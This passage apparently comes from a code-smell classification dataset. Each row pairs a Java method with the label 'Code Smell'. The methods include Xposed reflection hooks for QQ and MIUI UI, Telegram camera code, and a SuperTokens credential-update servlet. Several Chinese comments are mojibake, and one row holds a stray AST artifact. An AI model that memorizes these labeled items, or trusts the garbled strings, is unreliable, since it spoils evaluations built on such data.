    Method m=kRFWLayerAnimPart.getDeclaredMethod(""initStartAnim"",ImageView.class);
    HookUtils.hookAfterIfEnabled(this,m,param -> {
      Object mDragLayout=Reflex.getInstanceObject(param.thisObject,""mDragLayout"",null);
      Reflex.setInstanceObject(mDragLayout,""mWindowBgDrawable"",new ColorDrawable(Color.TRANSPARENT));
    }
);
    Method m2=kRFWLayerAnimPart.getDeclaredMethod(""updateBackgroundAlpha"",int.class);
    HookUtils.hookBeforeIfEnabled(this,m2,param -> {
      param.args[0]=0;
    }
);
  }
  Class<?> kBrowserBaseScene=DexKit.loadClassFromCache(CGalleryBaseScene.INSTANCE);
  if (kBrowserBaseScene != null) {
    Method m;
    try {
      m=kBrowserBaseScene.getDeclaredMethod(""a"",ViewGroup.class);
    }
 catch (    NoSuchMethodException e) {
      m=kBrowserBaseScene.getDeclaredMethod(""onCreate"");
    }
    Field fv=null;
    for (    Field f : kBrowserBaseScene.getDeclaredFields()) {
      if (f.getType().equals(View.class)) {
        f.setAccessible(true);
        fv=f;
        break;
      }
    }
    if (fv == null) {
      throw new IllegalStateException(""GalleryBgHook: targetView is null"");
    }
    final Field targetView=fv;
    HookUtils.hookAfterIfEnabled(this,m,param -> {
      View v=(View)targetView.get(param.thisObject);
      v.setBackgroundColor(0x00000000);
    }
);
  }
  Class<?> legacyAIOGalleryActivity=Initiator.load(""com.tencent.mobileqq.activity.aio.photo.AIOGalleryActivity"");
  if (legacyAIOGalleryActivity != null) {
    Class<?> kAbstractGalleryScene=DexKit.requireClassFromCache(CAbsGalScene.INSTANCE);
    Method m=Reflex.findSingleMethod(kAbstractGalleryScene,void.class,false,ViewGroup.class);
    Field fv=null;
    for (    Field f : kAbstractGalleryScene.getDeclaredFields()) {
      if (f.getType().equals(View.class)) {
        f.setAccessible(true);
        fv=f;
        break;
      }
    }
    if (fv == null) {
      throw new IllegalStateException(""GalleryBgHook: targetView is null"");
    }
    final Field targetView=fv;
    HookUtils.hookAfterIfEnabled(this,m,param -> {
      View v=(View)targetView.get(param.thisObject);
      v.setBackgroundColor(0x00000000);
    }
);
  }
  return true;
}",1,Code Smell
"/** 
 * 閫氳繃poolToken娣诲姞PoolToken
 * @param poolToken
 * @return
 */
public String addPoolToken(poolToken poolToken){
  String resPoolToken;
  try {
    String shareTokens=getShareTokens(poolToken.getShareTokens());
    String temPoolToken=poolToken.getPoolToken();
    if (temPoolToken != null && temPoolToken.contains(""pk"")) {
      resPoolToken=apiService.getPoolToken(temPoolToken,shareTokens);
    }
 else {
      resPoolToken=apiService.getPoolToken("""",shareTokens);
    }
  }
 catch (  Exception ex) {
    throw new RuntimeException(ex);
  }
  try {
    if (resPoolToken == null) {
      return ""pool_token鏁版嵁娣诲姞澶辫触锛岃鍏堟寜鍏ㄩ儴閫夋嫨骞剁敓鎴愶紝骞剁‘淇漸rl閰嶅姝ｇ‘锛"";
    }
    poolToken.setPoolToken(resPoolToken);
    if (poolToken.isIntoOneApi()) {
      String[] strings=systemService.selectOneAPi();
      boolean b=addKey(poolToken,strings);
      if (b && poolToken.getPriority() != 0) {
        boolean b1=getPriority(poolToken,strings);
        if (b1) {
          log.info(""淇敼浼樺厛绾ф垚鍔燂紒"");
        }
      }
      if (b) {
        log.info(""pool_token杩沷ne-Api鎴愬姛锛"");
      }
 else {
        return ""pool_token娣诲姞杩沷ne-api澶辫触锛"";
      }
    }
    String parent=selectFile();
    File jsonFile=new File(parent);
    Path jsonFilePath=Paths.get(parent);
    ObjectMapper objectMapper=new ObjectMapper();
    ObjectNode rootNode;
    if (!jsonFile.exists()) {
      Files.createFile(jsonFilePath);
      System.out.println(""pool.json鍒涘缓瀹屾垚: "" + jsonFilePath);
      rootNode=objectMapper.createObjectNode();
    }
 else {
      if (Files.exists(jsonFilePath) && Files.size(jsonFilePath) > 0) {
        rootNode=objectMapper.readTree(jsonFile).deepCopy();
      }
 else {
        rootNode=objectMapper.createObjectNode();
      }
    }
    return addPoolJson(poolToken,resPoolToken) ? ""pool_token鏁版嵁娣诲姞鎴愬姛"" : ""娣诲姞澶辫触锛"";
  }
 catch (  IOException e) {
    e.printStackTrace();
    return ""娣诲姞澶辫触锛"";
  }
}",1,Code Smell
"@Deprecated private boolean initCamera(){
  if (useCamera2) {
    return true;
  }
  ArrayList<CameraInfo> cameraInfos=CameraController.getInstance().getCameras();
  if (cameraInfos == null) {
    return false;
  }
  CameraInfo notFrontface=null;
  for (int a=0; a < cameraInfos.size(); a++) {
    CameraInfo cameraInfo=cameraInfos.get(a);
    if (!cameraInfo.isFrontface()) {
      notFrontface=cameraInfo;
    }
    if (isFrontface && cameraInfo.isFrontface() || !isFrontface && !cameraInfo.isFrontface()) {
      selectedCamera=cameraInfo;
      break;
    }
 else {
      notFrontface=cameraInfo;
    }
  }
  if (selectedCamera == null) {
    selectedCamera=notFrontface;
  }
  if (selectedCamera == null) {
    return false;
  }
  ArrayList<Size> previewSizes=selectedCamera.getPreviewSizes();
  ArrayList<Size> pictureSizes=selectedCamera.getPictureSizes();
  previewSize[0]=chooseOptimalSize(previewSizes);
  pictureSize=chooseOptimalSize(pictureSizes);
  if (previewSize[0].mWidth != pictureSize.mWidth) {
    boolean found=false;
    for (int a=previewSizes.size() - 1; a >= 0; a--) {
      Size preview=previewSizes.get(a);
      for (int b=pictureSizes.size() - 1; b >= 0; b--) {
        Size picture=pictureSizes.get(b);
        if (preview.mWidth >= pictureSize.mWidth && preview.mHeight >= pictureSize.mHeight && preview.mWidth == picture.mWidth && preview.mHeight == picture.mHeight) {
          previewSize[0]=preview;
          pictureSize=picture;
          found=true;
          break;
        }
      }
      if (found) {
        break;
      }
    }
    if (!found) {
      for (int a=previewSizes.size() - 1; a >= 0; a--) {
        Size preview=previewSizes.get(a);
        for (int b=pictureSizes.size() - 1; b >= 0; b--) {
          Size picture=pictureSizes.get(b);
          if (preview.mWidth >= 360 && preview.mHeight >= 360 && preview.mWidth == picture.mWidth && preview.mHeight == picture.mHeight) {
            previewSize[0]=preview;
            pictureSize=picture;
            found=true;
            break;
          }
        }
        if (found) {
          break;
        }
      }
    }
  }
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""InstantCamera preview w = "" + previewSize[0].mWidth + "" h = ""+ previewSize[0].mHeight);
  }
  return true;
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.storiesUpdated) {
    if (listViewAdapter != null) {
      listViewAdapter.setStories(getMessagesController().getStoriesController().getHiddenList(),true);
    }
    MessagesController.getInstance(currentAccount).getStoriesController().loadHiddenStories();
  }
 else   if (id == NotificationCenter.contactsDidLoad) {
    if (listViewAdapter != null) {
      if (!sortByName) {
        listViewAdapter.setSortType(2,true);
      }
      listViewAdapter.notifyDataSetChanged();
    }
    if (searchListViewAdapter != null && listView.getAdapter() == searchListViewAdapter) {
      searchListViewAdapter.searchDialogs(searchQuery);
    }
  }
 else   if (id == NotificationCenter.updateInterfaces) {
    int mask=(Integer)args[0];
    if ((mask & MessagesController.UPDATE_MASK_AVATAR) != 0 || (mask & MessagesController.UPDATE_MASK_NAME) != 0 || (mask & MessagesController.UPDATE_MASK_STATUS) != 0) {
      updateVisibleRows(mask);
    }
    if ((mask & MessagesController.UPDATE_MASK_STATUS) != 0 && !sortByName && listViewAdapter != null) {
      scheduleSort();
    }
  }
 else   if (id == NotificationCenter.encryptedChatCreated) {
    if (createSecretChat && creatingChat) {
      TLRPC.EncryptedChat encryptedChat=(TLRPC.EncryptedChat)args[0];
      Bundle args2=new Bundle();
      args2.putInt(""enc_id"",encryptedChat.id);
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.closeChats);
      presentFragment(new ChatActivity(args2),false);
    }
  }
 else   if (id == NotificationCenter.closeChats) {
    if (!creatingChat) {
      removeSelfFromStack(true);
    }
  }
}",1,Code Smell
"@Override protected void before(MethodHookParam param){
  boolean useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mPanelController""),""isExpandable"");
  if (useCC) {
    FrameLayout bar=(FrameLayout)param.thisObject;
    Object mControlPanelWindowManager=XposedHelpers.getObjectField(param.thisObject,""mControlPanelWindowManager"");
    boolean dispatchToControlPanel=(boolean)XposedHelpers.callMethod(mControlPanelWindowManager,""dispatchToControlPanel"",param.args[0],bar.getWidth());
    if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
      XposedHelpers.setObjectField(mControlPanelWindowManager,""transToControlPanel"",dispatchToControlPanel);
    }
 else     if (isAndroidVersion(34)) {
      XposedHelpers.setObjectField(mControlPanelWindowManager,""mTransToControlPanel"",dispatchToControlPanel);
    }
 else {
      XposedHelpers.callMethod(mControlPanelWindowManager,""setTransToControlPanel"",dispatchToControlPanel);
    }
    param.setResult(dispatchToControlPanel);
    return;
  }
  param.setResult(false);
}
@Override protected void before(MethodHookParam param){
  boolean added=XposedHelpers.getBooleanField(param.thisObject,""added"");
  if (added) {
    boolean useCC;
    Object controlCenterWindowView;
    if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
      useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""controlCenterController""),""useControlCenter"");
    }
 else     if (isMoreAndroidVersion(33)) {
      useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""useControlCenter"");
    }
 else {
      useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""isExpandable"");
    }
    if (useCC) {
      MotionEvent motionEvent=(MotionEvent)param.args[0];
      if (motionEvent.getActionMasked() == 0) {
        if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
          XposedHelpers.setObjectField(param.thisObject,""downX"",motionEvent.getRawX());
        }
 else {
          XposedHelpers.setObjectField(param.thisObject,""mDownX"",motionEvent.getRawX());
        }
      }
      if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
        controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""windowView"");
      }
 else {
        controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""mControlPanel"");
      }
      if (controlCenterWindowView == null) {
        param.setResult(false);
      }
 else {
        float mDownX;
        if (isMoreHyperOSVersion(1f) && isAndroidVersion(34)) {
          mDownX=XposedHelpers.getFloatField(param.thisObject,""downX"");
        }
 else {
          mDownX=XposedHelpers.getFloatField(param.thisObject,""mDownX"");
        }
        float width=(float)param.args[1];
        if (mDownX < width / 2.0f) {
          param.setResult(XposedHelpers.callMethod(controlCenterWindowView,""handleMotionEvent"",motionEvent,true));
        }
 else {
          param.setResult(false);
        }
      }
      return;
    }
  }
  param.setResult(false);
}",1,Code Smell
"@Override public void draw(@NonNull Canvas canvas){
  if (cross && progress != 1f) {
    progress+=16f / 150f;
    invalidateSelf();
    if (progress > 1f) {
      progress=1f;
    }
  }
 else   if (!cross && progress != 0f) {
    progress-=16f / 150f;
    invalidateSelf();
    if (progress < 0) {
      progress=0;
    }
  }
  int newColor=colorKey < 0 ? Color.WHITE : Theme.getColor(colorKey);
  if (color != newColor) {
    color=newColor;
    paint.setColor(newColor);
    iconDrawable.setColorFilter(new PorterDuffColorFilter(newColor,PorterDuff.Mode.MULTIPLY));
  }
  if (progress == 0) {
    iconDrawable.draw(canvas);
    return;
  }
  rectF.set(iconDrawable.getBounds());
  canvas.saveLayerAlpha(rectF,255,Canvas.ALL_SAVE_FLAG);
  iconDrawable.draw(canvas);
  float startX=rectF.left + AndroidUtilities.dpf2(4.5f) + xOffset+ lenOffsetTop;
  float startY=rectF.top + AndroidUtilities.dpf2(4.5f) - AndroidUtilities.dp(1) + lenOffsetTop;
  float stopX=rectF.right - AndroidUtilities.dp(3) + xOffset - lenOffsetBottom;
  float stopY=rectF.bottom - AndroidUtilities.dp(1) - AndroidUtilities.dp(3)- lenOffsetBottom;
  if (cross) {
    stopX=startX + (stopX - startX) * progress;
    stopY=startY + (stopY - startY) * progress;
  }
 else {
    startX=startX + (stopX - startX) * (1f - progress);
    startY=startY + (stopY - startY) * (1f - progress);
  }
  canvas.drawLine(startX,startY - paint.getStrokeWidth(),stopX,stopY - paint.getStrokeWidth(),xRefPaint);
  float offsetY=(xRefPaint.getStrokeWidth() - paint.getStrokeWidth()) / 2f + 1;
  canvas.drawLine(startX,startY - offsetY,stopX,stopY - offsetY,xRefPaint);
  canvas.drawLine(startX,startY,stopX,stopY,paint);
  canvas.restore();
}",1,Code Smell
"@Override protected void doPut(HttpServletRequest req,HttpServletResponse resp) throws IOException, ServletException {
  JsonObject input=InputParser.parseJsonObjectOrThrowError(req);
  String newEmail=InputParser.parseStringOrThrowError(input,""newEmail"",true);
  if (newEmail != null) {
    newEmail=Utils.normalizeAndValidateStringParam(newEmail,""newEmail"");
    newEmail=io.supertokens.utils.Utils.normaliseEmail(newEmail);
    if (!Dashboard.isValidEmail(newEmail)) {
      JsonObject response=new JsonObject();
      response.addProperty(""status"",""INVALID_EMAIL_ERROR"");
      super.sendJsonResponse(200,response,resp);
      return;
    }
  }
  String newPassword=InputParser.parseStringOrThrowError(input,""newPassword"",true);
  if (newPassword != null) {
    newPassword=Utils.normalizeAndValidateStringParam(newPassword,""newPassword"");
    String passwordErrorMessage=Dashboard.validatePassword(newPassword);
    if (passwordErrorMessage != null) {
      JsonObject response=new JsonObject();
      response.addProperty(""status"",""PASSWORD_WEAK_ERROR"");
      response.addProperty(""message"",passwordErrorMessage);
      super.sendJsonResponse(200,response,resp);
      return;
    }
  }
  try {
    AppIdentifier appIdentifier=getAppIdentifier(req);
    Storage storage=enforcePublicTenantAndGetPublicTenantStorage(req);
    String userId=InputParser.parseStringOrThrowError(input,""userId"",true);
    if (userId != null) {
      userId=Utils.normalizeAndValidateStringParam(userId,""userId"");
      DashboardUser user=Dashboard.updateUsersCredentialsWithUserId(appIdentifier,storage,main,userId,newEmail,newPassword);
      JsonObject userJsonObject=new JsonParser().parse(new Gson().toJson(user)).getAsJsonObject();
      JsonObject response=new JsonObject();
      response.addProperty(""status"",""OK"");
      response.add(""user"",userJsonObject);
      super.sendJsonResponse(200,response,resp);
      return;
    }
    String email=InputParser.parseStringOrThrowError(input,""email"",true);
    if (email != null) {
      email=Utils.normalizeAndValidateStringParam(email,""email"");
      email=io.supertokens.utils.Utils.normaliseEmail(email);
      DashboardUser user=Dashboard.getDashboardUserByEmail(appIdentifier,storage,email);
      if (user == null) {
        throw new UserIdNotFoundException();
      }
      DashboardUser updatedUser=Dashboard.updateUsersCredentialsWithUserId(appIdentifier,storage,main,user.userId,newEmail,newPassword);
      JsonObject userJsonObject=new JsonParser().parse(new Gson().toJson(updatedUser)).getAsJsonObject();
      JsonObject response=new JsonObject();
      response.addProperty(""status"",""OK"");
      response.add(""user"",userJsonObject);
      super.sendJsonResponse(200,response,resp);
      return;
    }
  }
 catch (  DuplicateEmailException e) {
    JsonObject response=new JsonObject();
    response.addProperty(""status"",""EMAIL_ALREADY_EXISTS_ERROR"");
    super.sendJsonResponse(200,response,resp);
    return;
  }
catch (  UserIdNotFoundException e) {
    JsonObject response=new JsonObject();
    response.addProperty(""status"",""UNKNOWN_USER_ERROR"");
    super.sendJsonResponse(200,response,resp);
    return;
  }
catch (  StorageQueryException|StorageTransactionLogicException|TenantOrAppNotFoundException|BadPermissionException e) {
    throw new ServletException(e);
  }
  throw new ServletException(new WebserverAPI.BadRequestException(""Either field 'email' or 'userId' must be present""));
}",1,Code Smell
"@NonNull public static Method findMethod(@NonNull Class<?> clazz,@Nullable Class<?> returnType,@NonNull String name,@NonNull Class<?>... paramTypes) throws NoSuchMethodException {
  Objects.requireNonNull(clazz,""clazz == null"");
  Objects.requireNonNull(name,""name == null"");
  int argc=paramTypes.length;
  Class<?> current=clazz;
  do {
    Method[] methods=current.getDeclaredMethods();
    loop:     for (    Method value : methods) {
      if (value.getName().equals(name)) {
        Class<?>[] argt=value.getParameterTypes();
        if (argt.length == argc) {
          for (int ii=0; ii < argt.length; ii++) {
            if (!argt[ii].equals(paramTypes[ii])) {
              continue loop;
            }
          }
          if (returnType != null && !returnType.equals(value.getReturnType())) {
            continue;
          }
          Method method=value;
          method.setAccessible(true);
          return method;
        }
      }
    }
    current=current.getSuperclass();
  }
 while (current != null && current != Object.class);
  throw new NoSuchMethodException(""No method "" + clazz.getName() + "".""+ name+ Arrays.toString(paramTypes)+ (returnType == null ? """" : "" with return type "" + returnType.getName())+ "" found"");
}
@NonNull public static Method findMethod(@NonNull Class<?> clazz,@NonNull String name,@NonNull Class<?>... paramTypes) throws NoSuchMethodException {
  return findMethod(clazz,null,name,paramTypes);
}",1,Code Smell
"@Override public Space visitSpace(Space space,Space.Location loc,P p){
  getCursor().putMessage(""lastLocation"",loc);
  boolean alignToAnnotation=false;
  Cursor parent=getCursor().getParent();
  if (parent != null && parent.getValue() instanceof J.Annotation) {
    parent.getParentOrThrow().putMessage(""afterAnnotation"",true);
  }
 else   if (parent != null && !getCursor().getParentOrThrow().getPath(J.Annotation.class::isInstance).hasNext()) {
    alignToAnnotation=getCursor().pollNearestMessage(""afterAnnotation"") != null && !(getCursor().getParentOrThrow().getValue() instanceof J.Annotation);
  }
  if (space.getComments().isEmpty() && !space.getLastWhitespace().contains(""\n"") || parent == null) {
    return space;
  }
  if (loc == Space.Location.METHOD_SELECT_SUFFIX) {
    Integer chainedIndent=getCursor().getParentTreeCursor().getMessage(""chainedIndent"");
    if (chainedIndent != null) {
      getCursor().getParentTreeCursor().putMessage(""lastIndent"",chainedIndent);
      return indentTo(space,chainedIndent,loc);
    }
  }
  int indent=getCursor().getNearestMessage(""lastIndent"",0);
  IndentType indentType=getCursor().getParentOrThrow().getNearestMessage(""indentType"",IndentType.ALIGN);
  Object value=getCursor().getValue();
  boolean alignBlockPrefixToParent=loc.equals(Space.Location.BLOCK_PREFIX) && space.getWhitespace().contains(""\n"") && (value instanceof J.Block && !(getCursor().getParentTreeCursor().getValue() instanceof J.Block));
  boolean alignBlockToParent=loc.equals(Space.Location.BLOCK_END) || loc.equals(Space.Location.NEW_ARRAY_INITIALIZER_SUFFIX) || loc.equals(Space.Location.CATCH_PREFIX)|| loc.equals(Space.Location.TRY_FINALLY)|| loc.equals(Space.Location.ELSE_PREFIX);
  if ((loc.equals(Space.Location.EXTENDS) && space.getWhitespace().contains(""\n"")) || Space.Location.EXTENDS.equals(getCursor().getParent().getMessage(""lastLocation""))) {
    indentType=IndentType.CONTINUATION_INDENT;
  }
  if (alignBlockPrefixToParent || alignBlockToParent || alignToAnnotation) {
    indentType=IndentType.ALIGN;
  }
switch (indentType) {
case ALIGN:
    break;
case INDENT:
  indent+=style.getIndentSize();
break;
case CONTINUATION_INDENT:
indent+=style.getContinuationIndent();
break;
}
Space s=indentTo(space,indent,loc);
if (value instanceof J && !(value instanceof J.EnumValueSet)) {
getCursor().putMessage(""lastIndent"",indent);
}
 else if (loc == Space.Location.METHOD_SELECT_SUFFIX) {
getCursor().getParentTreeCursor().putMessage(""lastIndent"",indent);
}
return s;
}",1,Code Smell
"@Override public int changeCollect(boolean result,String app,String stream,String mediaServerId,String startTime,String endTime,String callId){
  Long startTimeStamp=null;
  Long endTimeStamp=null;
  if (startTime != null) {
    if (!DateUtil.verification(startTime,DateUtil.formatter)) {
      throw new ControllerException(ErrorCode.ERROR100.getCode(),""寮�濮嬫椂闂存牸寮忛敊璇紝姝ｇ‘鏍煎紡涓猴細 "" + DateUtil.formatter);
    }
    startTimeStamp=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(startTime);
  }
  if (endTime != null) {
    if (!DateUtil.verification(endTime,DateUtil.formatter)) {
      throw new ControllerException(ErrorCode.ERROR100.getCode(),""缁撴潫鏃堕棿鏍煎紡閿欒锛屾纭牸寮忎负锛� "" + DateUtil.formatter);
    }
    endTimeStamp=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(endTime);
  }
  List<MediaServer> mediaServerItems;
  if (!ObjectUtils.isEmpty(mediaServerId)) {
    mediaServerItems=new ArrayList<>();
    MediaServer mediaServerItem=mediaServerService.getOne(mediaServerId);
    if (mediaServerItem == null) {
      throw new ControllerException(ErrorCode.ERROR100.getCode(),""鏈壘鍒版祦濯掍綋: "" + mediaServerId);
    }
    mediaServerItems.add(mediaServerItem);
  }
 else {
    mediaServerItems=null;
  }
  List<CloudRecordItem> all=cloudRecordServiceMapper.getList(null,app,stream,startTimeStamp,endTimeStamp,callId,mediaServerItems);
  if (all.isEmpty()) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""鏈壘鍒板緟鏀惰棌鐨勮棰�"");
  }
  int limitCount=50;
  int resultCount=0;
  if (all.size() > limitCount) {
    for (int i=0; i < all.size(); i+=limitCount) {
      int toIndex=i + limitCount;
      if (i + limitCount > all.size()) {
        toIndex=all.size();
      }
      resultCount+=cloudRecordServiceMapper.updateCollectList(result,all.subList(i,toIndex));
    }
  }
 else {
    resultCount=cloudRecordServiceMapper.updateCollectList(result,all);
  }
  return resultCount;
}",1,Code Smell
"@Override protected String toEL(Integer depth,StringBuilder paramContext){
  checkMaxWaitSeconds();
  Integer sonDepth=depth == null ? null : depth + 1;
  StringBuilder sb=new StringBuilder();
  processWrapperTabs(sb,depth);
  sb.append(""PAR("");
  processWrapperNewLine(sb,depth);
  for (int i=0; i < this.getElWrapperList().size(); i++) {
    if (i > 0) {
      sb.append("","");
      processWrapperNewLine(sb,depth);
    }
    sb.append(this.getElWrapperList().get(i).toEL(sonDepth,paramContext));
  }
  processWrapperNewLine(sb,depth);
  processWrapperTabs(sb,depth);
  sb.append("")"");
  if (this.any) {
    sb.append("".any(true)"");
  }
  if (this.ignoreError) {
    sb.append("".ignoreError(true)"");
  }
  if (StrUtil.isNotBlank(customThreadExecutor)) {
    sb.append(StrUtil.format("".threadPool(\""{}\"")"",customThreadExecutor));
  }
  if (CollectionUtil.isNotEmpty(mustExecuteList)) {
    if (this.any) {
      throw new IllegalArgumentException(""'.must()' and '.any()' can use in when component at the same time!"");
    }
    sb.append("".must("");
    for (int i=0; i < mustExecuteList.size(); i++) {
      if (i > 0) {
        sb.append("", "");
      }
      sb.append(StrUtil.format(""\""{}\"""",mustExecuteList.get(i)));
    }
    sb.append("")"");
  }
  processWrapperProperty(sb,paramContext);
  return sb.toString();
}",1,Code Smell
"/** 
 * 璁＄畻褰撳墠璇勫鐨勫姛鑳界敤渚嬬殑璇勫缁撴灉
 * @param request 璇勫瑙勫垯
 * @return 鍔熻兘鐢ㄤ緥鐨勮瘎瀹＄粨鏋�
 */
private String getFunctionalCaseStatus(ReviewFunctionalCaseRequest request,Map<String,List<CaseReviewHistory>> hasReviewedUserMap,boolean isAdmin,int reviewerNum){
  String functionalCaseStatus;
  CaseReviewFunctionalCaseExample caseReviewFunctionalCaseExample=new CaseReviewFunctionalCaseExample();
  caseReviewFunctionalCaseExample.createCriteria().andReviewIdEqualTo(request.getReviewId()).andCaseIdEqualTo(request.getCaseId());
  List<CaseReviewFunctionalCase> caseReviewFunctionalCases=caseReviewFunctionalCaseMapper.selectByExample(caseReviewFunctionalCaseExample);
  String status=caseReviewFunctionalCases.get(0).getStatus();
  if (StringUtils.equals(request.getReviewPassRule(),CaseReviewPassRule.SINGLE.toString())) {
    if (StringUtils.equalsIgnoreCase(request.getStatus(),FunctionalCaseReviewStatus.UNDER_REVIEWED.toString()) || isAdmin) {
      functionalCaseStatus=status;
    }
 else {
      functionalCaseStatus=request.getStatus();
    }
  }
 else {
    if (isAdmin) {
      return status;
    }
    AtomicInteger passCount=new AtomicInteger();
    AtomicInteger unPassCount=new AtomicInteger();
    hasReviewedUserMap.forEach((k,v) -> {
      List<CaseReviewHistory> list=v.stream().sorted(Comparator.comparing(CaseReviewHistory::getCreateTime).reversed()).toList();
      if (StringUtils.equalsIgnoreCase(list.get(0).getStatus(),FunctionalCaseReviewStatus.PASS.toString())) {
        passCount.set(passCount.get() + 1);
      }
      if (StringUtils.equalsIgnoreCase(list.get(0).getStatus(),FunctionalCaseReviewStatus.UN_PASS.toString())) {
        unPassCount.set(unPassCount.get() + 1);
      }
    }
);
    if (hasReviewedUserMap.get(UserRoleScope.SYSTEM) != null) {
      hasReviewedUserMap.remove(UserRoleScope.SYSTEM);
    }
    if (unPassCount.get() > 0) {
      functionalCaseStatus=FunctionalCaseReviewStatus.UN_PASS.toString();
    }
 else     if (reviewerNum > hasReviewedUserMap.size()) {
      functionalCaseStatus=FunctionalCaseReviewStatus.UNDER_REVIEWED.toString();
    }
 else {
      if (passCount.get() == hasReviewedUserMap.size()) {
        functionalCaseStatus=FunctionalCaseReviewStatus.PASS.toString();
      }
 else {
        functionalCaseStatus=FunctionalCaseReviewStatus.UNDER_REVIEWED.toString();
      }
    }
  }
  return functionalCaseStatus;
}",1,Code Smell
"private RealInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private RealInfoProto(){
  name_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@463d7f6a",1,Code Smell
"/** 
 * Fill the <code>PreparedStatement</code> replacement parameters with the given objects.
 * @param stmt   PreparedStatement to fill
 * @param params Query replacement parameters; <code>null</code> is a validvalue to pass in.
 * @throws SQLException if a database access error occurs
 */
public void fillStatement(PreparedStatement stmt,Object... params) throws SQLException {
  ParameterMetaData pmd=null;
  if (!pmdKnownBroken) {
    pmd=stmt.getParameterMetaData();
    int stmtCount=pmd.getParameterCount();
    int paramsCount=params == null ? 0 : params.length;
    if (stmtCount != paramsCount) {
      throw new SQLException(""Wrong number of parameters: expected "" + stmtCount + "", was given ""+ paramsCount);
    }
  }
  if (params == null) {
    return;
  }
  for (int i=0; i < params.length; i++) {
    if (params[i] != null) {
      if (params[i] instanceof int[] || params[i] instanceof Integer[]) {
        Array array=stmt.getConnection().createArrayOf(""INTEGER"",params);
        stmt.setArray(i + 1,array);
      }
      if (params[i] instanceof FieldValue) {
        FieldValue fieldValue=(FieldValue)params[i];
        if (JDBCType.NULL.equals(fieldValue.getSQLType())) {
          stmt.setObject(i + 1,fieldValue.getValue());
        }
 else {
          stmt.setObject(i + 1,fieldValue.getValue(),fieldValue.getSQLType());
        }
      }
 else {
        stmt.setObject(i + 1,params[i]);
      }
    }
 else {
      int sqlType=Types.VARCHAR;
      if (!pmdKnownBroken) {
        try {
          sqlType=pmd.getParameterType(i + 1);
        }
 catch (        SQLException e) {
          pmdKnownBroken=true;
        }
      }
      stmt.setNull(i + 1,sqlType);
    }
  }
}",1,Code Smell
"public boolean findClickableView(ViewGroup container,float x,float y,boolean swipeToDissmiss){
  if (container == null) {
    return false;
  }
  if (privacyHint != null && privacyHint.shown()) {
    return true;
  }
  if (soundTooltip != null && soundTooltip.shown()) {
    return true;
  }
  for (int i=0; i < container.getChildCount(); i++) {
    View child=container.getChildAt(i);
    if (child.getVisibility() != View.VISIBLE) {
      continue;
    }
    if (child == storyCaptionView) {
      child.getHitRect(AndroidUtilities.rectTmp2);
      if (AndroidUtilities.rectTmp2.contains((int)x,(int)y) && storyCaptionView.allowInterceptTouchEvent(x,y - child.getTop())) {
        return true;
      }
    }
    child.getHitRect(AndroidUtilities.rectTmp2);
    if (child == storyAreasView && !storyAreasView.hasSelected() && (x < dp(60) || x > container.getMeasuredWidth() - dp(60))) {
      if (storyAreasView.hasClickableViews(x,y)) {
        return true;
      }
    }
 else     if (keyboardVisible && child == chatActivityEnterView && y > AndroidUtilities.rectTmp2.top) {
      return true;
    }
 else     if (!swipeToDissmiss && AndroidUtilities.rectTmp2.contains((int)x,(int)y) && (((child.isClickable() || child == reactionsContainerLayout) && child.isEnabled()) || (chatActivityEnterView != null && child == chatActivityEnterView.getRecordCircle()))) {
      return true;
    }
 else     if (child.isEnabled() && child instanceof ViewGroup && findClickableView((ViewGroup)child,x - child.getX(),y - child.getY(),swipeToDissmiss)) {
      return true;
    }
  }
  return false;
}",1,Code Smell
"private void resolve(Collection<File> assetsDirs){
  List<File> lottieJsonFiles=new ArrayList<>();
  for (  File assetsDir : assetsDirs) {
    if (!assetsDir.isDirectory()) {
      continue;
    }
    URI base=assetsDir.toURI();
    for (    File f : Files_.fileTreeTraverser().preOrderTraversal(assetsDir)) {
      if (f.isFile() && !f.getName().equalsIgnoreCase("".DS_Store"")) {
        Pair<String,String> assetsTypeAndName=getAssetsTypeAndNameFromPath(f,base.relativize(f.toURI()).toString());
        Asset assets=new Asset(assetsTypeAndName.getFirst(),assetsTypeAndName.getSecond());
        assets.define(f.getPath());
        Map<String,Asset> map=this.assets.computeIfAbsent(assetsTypeAndName.getFirst(),e -> new HashMap<>());
        map.put(assetsTypeAndName.getSecond(),assets);
        if (f.getName().endsWith("".json"")) {
          lottieJsonFiles.add(f);
        }
      }
    }
  }
  LottieJsonHandler handler=new LottieJsonHandler(context);
  try {
    for (    File jsonFile : lottieJsonFiles) {
      handler.process(Files.asCharSource(jsonFile,Charset.forName(""utf-8"")).read());
    }
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
  this.resolvedAssets=new HashMap<>();
  for (  Map<String,Asset> map : assets.values()) {
    for (    Asset asset : map.values()) {
      this.resolvedAssets.put(asset.getName(),asset);
      if (!asset.getPath().equals("""")) {
        this.resolvedAssets.put(asset.getPath() + ""/"" + asset.getName(),asset);
      }
    }
  }
}",1,Code Smell
"public String generate(){
  if (!inaccessableMethods.isEmpty() || !inaccessableFields.isEmpty()) {
